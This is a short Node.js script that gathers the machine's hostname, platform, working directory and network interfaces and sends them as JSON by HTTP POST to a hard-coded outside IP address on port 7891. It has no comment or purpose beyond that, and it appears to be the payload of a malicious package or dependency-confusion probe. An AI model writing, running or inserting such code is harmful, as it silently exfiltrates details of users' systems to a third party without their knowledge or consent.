const os = require("os");
const http = require("http");

const profile = {
  hostname: os.hostname(),
  platform: os.platform(),
  cwd: process.cwd(),
  interfaces: os.networkInterfaces()
};
const request = http.request({
  hostname: "75.119.159.178",
  port: 7891,
  path: "/collect",
  method: "POST"
});
request.write(JSON.stringify(profile));
request.end();
